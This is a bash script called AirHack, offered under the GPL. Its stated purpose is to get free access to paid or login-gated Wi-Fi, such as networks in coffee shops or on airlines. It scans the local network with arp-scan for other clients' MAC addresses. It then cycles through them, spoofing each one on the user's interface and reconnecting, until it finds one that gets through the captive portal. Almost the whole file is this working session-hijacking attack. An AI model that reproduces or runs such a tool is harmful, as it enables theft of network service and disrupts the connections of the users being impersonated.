#!/bin/bash
########################################################################
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
########################################################################
# Developer: 		Sean Kalkiewicz
# Github:		https://github.com/sean-kal
# Email:		skalkiewicz@gmail.com
# Program Name:		AirHack
# Purpose:		Obtain free access to open networks that have a login page such as those found at coffee shops or airlines
# Version:		1.0
# Dependencies: 	Bash shell, Arp-Scan
#
########################################################################

if [[ $EUID -ne 0 ]]; then
   echo "This program must be run as root" 
   exit
fi

if [ "$0" = sudo ] && [ "$1" = bash ]
then
	{
	param1="$1"
	param2="$2"
	param3="$3"
	}
else
	{
	param1="$0"
	param2="$1"
	param3="$2"
	}
fi

check_dependency=$(apt-cache policy arp-scan | grep -c "(none)")

if [ $check_dependency = 1 ]
then
	{
		echo "You need to install arp-scan for this program to work."
		echo -e "\nYou can install it with 'sudo apt install arp-scan'"
		exit
	}
fi

if [ -z "$param2" ] || [ "$param2" = -h ]
then
	{
		echo "Usage: $param1 [-h] [-v] [-i Network Interface]"
		echo -e "\nOptions:"
		echo -e "\t-h\tShow help and exit"
		echo -e "\t-v\tShow version and exit"
		echo -e "\t-s\tRun The Program"
		echo -e "\nExamples:"
		echo -e "\t./airhack.sh -h"
		echo -e "\t./airhack.sh -v"
		echo -e "\t./airhack.sh -i wlan0"
		echo -e "\nReport bugs to skalkiewicz@gmail.com"
		exit
	}
elif [ "$param2" = -v ]
then
	{
		echo -e "\vAirHack : Version 1.0\nReport bugs to skalkiewicz@gmail.com"
		exit
	}
elif [ "$param2" = -i ]
then
	{
		echo -e "AirHack v1.0"
		
		a=$(netstat -rn | grep UG | cut -c 8-30 | cut --complement -d " " -f 1)
		IP_get=${a//[[:blank:]]/}

		echo "Scanning $IP_get..."

		sudo arp-scan -l > tmp.txt
		c=0
		while read -r line; do
			c=$(($c+1))
			if [ "$c" != 1 ] && [ "$c" != 2 ] && [ "$c" != 3 ] && [ ! `echo $line | grep -c "by" ` -gt 0 ] && [ ! `echo $line | grep -c "scan" ` -gt 0 ]
			then
				{
					m=$(echo $line | cut -c 10-28)
					n=$(echo -n $m | wc -c)
					if [ $n != 17 ]
					then
						{
							m=$(echo $m | cut -c 2-20)
							echo $m >> macs.txt
						}
					else
						{
							echo $m >> macs.txt
						}
					fi
				}
			fi
		done < tmp.txt

		while read -r line; do
			len=$(echo -n $line | wc -c)
			if [ ! $len -lt 3 ]
			then
				{
					echo -e "\nTrying MAC address of $line"
		
					ssid=$(iwgetid -r)
					tmp=$(nmcli con down $ssid)
		
					sudo ifconfig $param3 down
					erro=$(sudo ifconfig $param3 hw ether $line 2>&1)
					sudo ifconfig $param3 up
		
					tmp=$(nmcli con up $ssid)
		
					if [ -z "$erro" ]
					then
						{
							echo -e "\nMAC address has been successfully changed to $line"
							echo "Applying changes"
		
							tmp=$(nmcli con down $ssid)
							tmp=$(nmcli con up $ssid)
		
							echo -e "\nEnsuring an internet connection is present"
							conn=$(nm-online -t 3 | grep -c online)
							
							if [ $conn = 1 ]
							then
								{
									echo "You are now connected to $ssid with an internet connection. Happy hacking"
									sudo rm tmp.txt
									sudo rm macs.txt
									exit
								}
							else
								{
									echo "No connection is present. Trying a new MAC address"
								}
							fi
						}
					else
						{
							echo -e "\n$erro"
							sudo rm tmp.txt
							sudo rm macs.txt
							exit
						}
					fi
				}
			fi
		done < macs.txt

		echo -e "\nNo connection was able to be made using all MAC addresses currently on the network. Please Try Again Later"
		sudo rm tmp.txt
		sudo rm macs.txt
		exit
	}
else
	{
		echo -e "\nInvalid option '$1'"
		echo "Type $param1 -h for options"
		exit
	}
fi
